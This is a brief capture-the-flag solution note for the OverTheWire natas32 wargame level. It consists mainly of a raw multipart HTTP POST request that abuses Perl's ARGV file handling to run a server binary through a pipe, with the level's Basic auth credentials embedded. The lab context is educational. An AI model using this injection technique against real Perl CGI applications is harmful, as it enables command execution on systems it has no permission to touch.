same as natas31

post request see below, put it into burp suite repeater can get the answer

```
POST /index.pl?/var/www/natas/natas32/getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 419
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary75so85UzqpBrYcy6
Referer: http://natas32.natas.labs.overthewire.org/
Connection: close

------WebKitFormBoundary75so85UzqpBrYcy6
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundary75so85UzqpBrYcy6
Content-Disposition: form-data; name="file"; filename="test"
Content-Type: text/plain

dafdsafdsafdsfsdadfa
------WebKitFormBoundary75so85UzqpBrYcy6
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary75so85UzqpBrYcy6--


```